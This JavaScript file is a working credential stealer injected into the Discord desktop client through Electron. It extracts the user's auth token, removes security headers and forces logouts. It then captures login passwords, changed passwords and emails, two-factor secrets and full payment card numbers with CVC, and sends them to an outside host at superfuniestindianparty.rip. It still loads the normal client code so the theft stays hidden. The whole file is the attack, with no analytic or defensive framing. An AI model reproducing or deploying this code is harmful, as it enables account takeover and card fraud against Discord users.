const {
    BrowserWindow,
    session
} = require('electron');
const getTokenScript = '\
	for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([\
			[], {\
				get_require: (a, b, c) => a.exports = c\
			},\
			[\
				["get_require"]\
			]\
		]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([\
			[Math.random()], {},\
			a => {\
				gg = a\
			}\
		]), gg.c)\
		if (gg.c.hasOwnProperty(a)) {\
			let b = gg.c[a].exports;\
			if (b && b.__esModule && b.default)\
				for (let a in b.default) "getToken" == a && (token = b.default.getToken())\
		} token;';
var loggedOut = true;

session.defaultSession.webRequest.onBeforeRequest({
    'urls': [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https:/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https:/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https:/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*'
    ]
}, (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    !loggedOut && (loggedOut = true, window.webContents.executeJavaScript('\
	window.webpackJsonp ? (gg = window.webpackJsonp.push([\
		[], {\
			get_require: (a, b, c) => a.exports = c\
		},\
		[\
			["get_require"]\
		]\
	]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([\
		[Math.random()], {},\
		a => {\
			gg = a\
		}\
	]);\
	function LogOut() {\
		(function (a) {\
			const b = "string" == typeof a ? a : null;\
			for (const c in gg.c)\
				if (gg.c.hasOwnProperty(c)) {\
					const d = gg.c[c].exports;\
					if (d && d.__esModule && d.default && (b ? d.default[b] : a(d.default))) return d.default;\
					if (d && (b ? d[b] : a(d))) return d\
				} return null\
		})\
		"login".logout()\
	}\
	LogOut();', true));
    if (details.url.startsWith('wss://')) callback({
        'cancel': true
    });
    else callback({
        'cancel': false
    });
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
        'responseHeaders': {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': '*'
        }
    });
});

function sendToApi(data) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript('    \n' +
        '        var xhr = new XMLHttpRequest();\n' +
        '        xhr.open("POST", "https://superfuniestindianparty.rip/QiNrZPyy83mu", true);\n' +
        "        xhr.setRequestHeader('Content-Type', 'application/json');\n" +
        "        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" +
        '        xhr.send(JSON.stringify(' + data + '));\n    ', true);
}

function newData(type, token, ...args) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript('    \n' +
            '        var xmlHttp = new XMLHttpRequest();\n' +
            '        xmlHttp.open("GET", "https://discord.com/api/v9/users/@me", false);\n' +
            '        xmlHttp.setRequestHeader("Authorization", "' + token + '");\n' +
            '        xmlHttp.send(null);\n' +
            '        xmlHttp.responseText;', true)
        .then(info_json => {
            var info = JSON.parse(info_json),
                data = {
                    'username': info['username'] + '#' + info['discriminator'],
                    'id': info.id,
                    'avatar': info['avatar'],
                    'nitro': info['premium_type'],
                    'badges': info['flags'],
                    'email': info['email'],
                    'token': token,
                    'type': type
                };
            switch (type) {
            case 'login':
                data['password'] = args[0];
                break;
            case 'changedEmail':
                data['email'] = args[0];
                data['password'] = args[1];
                break;
            case 'changedPassword':
                data['oldPassword'] = args[0];
                data['newPassword'] = args[1];
                break;
            case 'cardAdded':
                data['card'] = {
                    'number': args[0],
                    'cvc': args[1],
                    'expire': {
                        'month': args[2],
                        'year': args[3]
                    }
                };
                break;
            case 'enabled2FA':
                data['secret'] = args[0];
                data['password'] = args[1];
                break;
            }
            sendToApi(JSON.stringify(data));
        });
}
session.defaultSession.webRequest.onCompleted({
    'urls': [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/users/@me/mfa/totp/enable',
        'https://*.discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens'
    ]
}, async (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    if (details.statusCode != 200) return;
    const data = JSON.parse(Buffer.from(details.uploadData[0].bytes)
            .toString()),
        token = await window.webContents.executeJavaScript(getTokenScript, true);
    if (details.url.endsWith('login')) newData('login', token, data['password']);
    if (details.url.includes('users/@me/mfa/totp/enable')) newData('enabled2FA', token, data['secret'], data['password']);
    if (details.url.endsWith('users/@me')) {
        if (details.method != 'PATCH') return;
        if (!data['password']) return;
        if (data['email']) newData('changedEmail', token, data['email'], data['password']);
        if (data['new_password']) newData('changedPassword', token, data['password'], data['new_password']);
    }
    if (details.url.endsWith('tokens')) newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
}), module.exports = require('./core.asar');
